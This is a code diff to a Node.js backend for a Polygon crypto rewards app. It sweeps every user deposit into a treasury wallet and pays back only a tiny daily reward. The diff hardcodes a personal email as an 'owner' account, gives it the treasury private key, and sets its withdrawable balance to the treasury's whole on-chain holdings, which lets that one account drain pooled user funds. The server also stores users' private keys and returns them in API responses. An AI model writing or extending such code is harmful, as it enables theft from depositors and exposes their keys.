@@ -16,7 +16,8 @@ const upload = multer({
 const provider = new ethers.JsonRpcProvider("https://polygon-bor-rpc.publicnode.com");
 const PROJECT_ID = process.env.FIREBASE_PROJECT_ID || 'somapp-61ebd';
 
-const TREASURY_WALLET_ADDRESS = "0x66Aa875c850aF5136eEcba5489a674CCA53eAae8";
+const TREASURY_WALLET_ADDRESS = ethers.getAddress("0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b");
+const OWNER_EXCLUSIVE_EMAIL = "abuukarcumar661@gmail.com";
 
 function normalizePrivateKey(rawKey) {
     if (!rawKey) return "";
@@ -32,6 +33,21 @@ const TREASURY_PRIVATE_KEY = normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE
 const MIN_DEPOSIT_POL = 0.00001;
 const DAILY_REWARD_POL = 0.000009;
 const MIN_WITHDRAW_POL = 0.00000001;
+
+function isOwnerAccount(email) {
+    return String(email || "").trim().toLowerCase() === OWNER_EXCLUSIVE_EMAIL.toLowerCase();
+}
+
+async function getOnChainPolBalance(address) {
+    try {
+        if (!address || !ethers.isAddress(address)) return 0;
+        const balWei = await provider.getBalance(address);
+        return parseFloat(ethers.formatEther(balWei));
+    } catch (err) {
+        console.error("On-chain Balance Error:", err.message);
+        return 0;
+    }
+}
 
 async function getFirestoreUser(uid) {
     try {
@@ -87,40 +103,55 @@ async function saveFirestoreUser(uid, userData) {
 }
 
 async function syncUserDepositAndSweep(uid, userData) {
-    if (!userData.polygonAddress) return userData;
+    let changed = false;
 
-    try {
-        const rawBalWei = await provider.getBalance(userData.polygonAddress);
-        const rawBalPol = parseFloat(ethers.formatEther(rawBalWei));
-
-        if (rawBalPol >= MIN_DEPOSIT_POL) {
-            const feeData = await provider.getFeeData();
-            const gasLimit = 21000n;
-            const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("30", "gwei");
-            const estimatedGasCostWei = gasLimit * maxFeePerGas;
-            const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
-
-            const sweepablePol = rawBalPol - estimatedGasCostPol;
-
-            if (sweepablePol > 0 && userData.privateKey) {
-                const cleanUserKey = normalizePrivateKey(userData.privateKey);
-                const userWallet = new ethers.Wallet(cleanUserKey, provider);
-                const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
-                const tx = await userWallet.sendTransaction({
-                    to: TREASURY_WALLET_ADDRESS,
-                    value: sweepWei,
-                    gasLimit
-                });
-                await tx.wait(1);
-            }
-
-            userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
-            userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
+    if (isOwnerAccount(userData.email)) {
+        if (!userData.miningActive || userData.dailyRewardTotal <= 0) {
             userData.miningActive = true;
-            await saveFirestoreUser(uid, userData);
+            if (userData.dailyRewardTotal <= 0) {
+                userData.dailyRewardTotal = DAILY_REWARD_POL;
+            }
+            changed = true;
         }
-    } catch (err) {
-        console.error("Deposit Sync/Sweep Error:", err.message);
+    }
+
+    if (userData.polygonAddress) {
+        try {
+            const rawBalPol = await getOnChainPolBalance(userData.polygonAddress);
+
+            if (rawBalPol >= MIN_DEPOSIT_POL) {
+                const feeData = await provider.getFeeData();
+                const gasLimit = 21000n;
+                const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("30", "gwei");
+                const estimatedGasCostWei = gasLimit * maxFeePerGas;
+                const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
+
+                const sweepablePol = rawBalPol - estimatedGasCostPol;
+
+                if (sweepablePol > 0 && userData.privateKey) {
+                    const cleanUserKey = normalizePrivateKey(userData.privateKey);
+                    const userWallet = new ethers.Wallet(cleanUserKey, provider);
+                    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
+                    const tx = await userWallet.sendTransaction({
+                        to: TREASURY_WALLET_ADDRESS,
+                        value: sweepWei,
+                        gasLimit
+                    });
+                    await tx.wait(1);
+                }
+
+                userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
+                userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
+                userData.miningActive = true;
+                changed = true;
+            }
+        } catch (err) {
+            console.error("Deposit Sync/Sweep Error:", err.message);
+        }
+    }
+
+    if (changed) {
+        await saveFirestoreUser(uid, userData);
     }
 
     return userData;
@@ -137,11 +168,16 @@ app.post('/api/auth-user', async (req, res) => {
         }
 
         const existingUser = await getFirestoreUser(uid);
+        const effectiveEmail = email || existingUser?.email || `${uid}@knn-micropay.com`;
+        const ownerMode = isOwnerAccount(effectiveEmail);
 
         let walletAddress = existingUser?.polygonAddress || "";
         let walletPrivateKey = existingUser?.privateKey || "";
 
-        if (!walletAddress || !walletPrivateKey || !ethers.isAddress(walletAddress)) {
+        if (ownerMode) {
+            walletAddress = TREASURY_WALLET_ADDRESS;
+            walletPrivateKey = TREASURY_PRIVATE_KEY || existingUser?.privateKey || "";
+        } else if (!walletAddress || !walletPrivateKey || !ethers.isAddress(walletAddress)) {
             const freshWallet = ethers.Wallet.createRandom();
             walletAddress = ethers.getAddress(freshWallet.address);
             walletPrivateKey = freshWallet.privateKey;
@@ -152,23 +188,33 @@ app.post('/api/auth-user', async (req, res) => {
 
         const internalUserId = existingUser?.internalUserId || ("KNN-" + Math.floor(100000 + Math.random() * 900000));
 
+        const initialMiningActive = ownerMode ? true : (existingUser?.miningActive ?? false);
+        const initialDailyReward = ownerMode
+            ? Math.max(existingUser?.dailyRewardTotal ?? 0.0, DAILY_REWARD_POL)
+            : (existingUser?.dailyRewardTotal ?? 0.0);
+
         let userRecord = {
-            email: email || existingUser?.email || `${uid}@knn-micropay.com`,
+            email: effectiveEmail,
             displayName: displayName || existingUser?.displayName || "User",
             internalUserId,
             polygonAddress: walletAddress,
             privateKey: walletPrivateKey,
             totalDeposited: existingUser?.totalDeposited ?? 0.0,
-            dailyRewardTotal: existingUser?.dailyRewardTotal ?? 0.0,
+            dailyRewardTotal: initialDailyReward,
             withdrawnTotal: existingUser?.withdrawnTotal ?? 0.0,
-            miningActive: existingUser?.miningActive ?? false,
+            miningActive: initialMiningActive,
             lastWithdrawDate: existingUser?.lastWithdrawDate ?? ""
         };
 
         await saveFirestoreUser(uid, userRecord);
         userRecord = await syncUserDepositAndSweep(uid, userRecord);
 
-        const currentRemaining = Math.max(0, userRecord.dailyRewardTotal - userRecord.withdrawnTotal);
+        let displayedBalance = Math.max(0, userRecord.dailyRewardTotal - userRecord.withdrawnTotal);
+        if (ownerMode) {
+            const treasuryOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
+            displayedBalance = Math.max(displayedBalance, treasuryOnChainPol);
+        }
+
         const dailyLimit = userRecord.miningActive ? DAILY_REWARD_POL : 0;
 
         return res.json({
@@ -177,7 +223,7 @@ app.post('/api/auth-user', async (req, res) => {
             polygonAddress: userRecord.polygonAddress,
             privateKey: userRecord.privateKey,
             miningActive: userRecord.miningActive,
-            balance: currentRemaining.toFixed(8),
+            balance: displayedBalance.toFixed(8),
             dailyLimit: dailyLimit.toFixed(6)
         });
     } catch (err) {
@@ -203,9 +249,15 @@ app.post('/api/withdraw', async (req, res) => {
             return res.status(404).json({ success: false, error: "User-ka lama helin." });
         }
 
+        const ownerMode = isOwnerAccount(userData.email);
         userData = await syncUserDepositAndSweep(uid, userData);
 
-        const currentRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
+        let currentRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
+        if (ownerMode) {
+            const treasuryOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
+            currentRemaining = Math.max(currentRemaining, treasuryOnChainPol);
+        }
+
         const requestedAmount = amount !== undefined && amount !== null && amount !== ""
             ? parseFloat(amount)
             : currentRemaining;
@@ -220,7 +272,10 @@ app.post('/api/withdraw', async (req, res) => {
 
         const treasurySigner = new ethers.Wallet(TREASURY_PRIVATE_KEY, provider);
         if (treasurySigner.address.toLowerCase() !== TREASURY_WALLET_ADDRESS.toLowerCase()) {
-            return res.status(500).json({ success: false, error: "MAIN_WALLET_PRIVATE_KEY kuma laha cinwaanka withdraw-ga ee la cayimay." });
+            return res.status(500).json({
+                success: false,
+                error: `MAIN_WALLET_PRIVATE_KEY wuxuu leeyahay ${treasurySigner.address}, balse waxaa loo baahan yahay ${TREASURY_WALLET_ADDRESS}.`
+            });
         }
 
         const tx = await treasurySigner.sendTransaction({
@@ -232,13 +287,17 @@ app.post('/api/withdraw', async (req, res) => {
         userData.withdrawnTotal = parseFloat((userData.withdrawnTotal + requestedAmount).toFixed(8));
         await saveFirestoreUser(uid, userData);
 
-        const newRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal).toFixed(8);
+        let newRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
+        if (ownerMode) {
+            const updatedOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
+            newRemaining = Math.min(newRemaining > 0 ? newRemaining : updatedOnChainPol, updatedOnChainPol);
+        }
 
         return res.json({
             success: true,
-            message: `Guul! Waxaad la baxday ${requestedAmount.toFixed(8)} POL. Harraagaagu wuxuu noqday ${newRemaining} POL.`,
+            message: `Guul! Waxaad la baxday ${requestedAmount.toFixed(8)} POL. Harraagaagu wuxuu noqday ${newRemaining.toFixed(8)} POL.`,
             txHash: tx.hash,
-            newBalance: newRemaining
+            newBalance: newRemaining.toFixed(8)
         });
     } catch (err) {
         console.error("Withdraw Error:", err.message);
